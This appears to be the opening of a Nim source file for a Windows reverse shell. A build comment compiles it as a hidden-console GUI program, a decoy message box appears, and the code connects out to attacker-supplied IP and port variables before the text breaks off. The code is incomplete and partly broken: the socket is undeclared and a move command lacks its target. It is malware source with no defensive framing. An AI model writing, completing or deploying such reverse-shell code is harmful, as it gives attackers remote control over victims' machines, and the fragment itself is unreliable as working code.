import winim
import osproc

MessageBox(0, "Hello, world!", "Nim is Powerful", 0)

#nim c -d:mingw --app:gui reverseShell.nim && mv nimshell.exe

var 
    targetIP = ""
    targetPort = ""

let 
    exitMessage = "Exited"
    changeDirectoryCommand = "cd"
    defaultDirectory = "C:\\"

try:
    socket.connect(targetIP, Port(parseInt(targetPort)))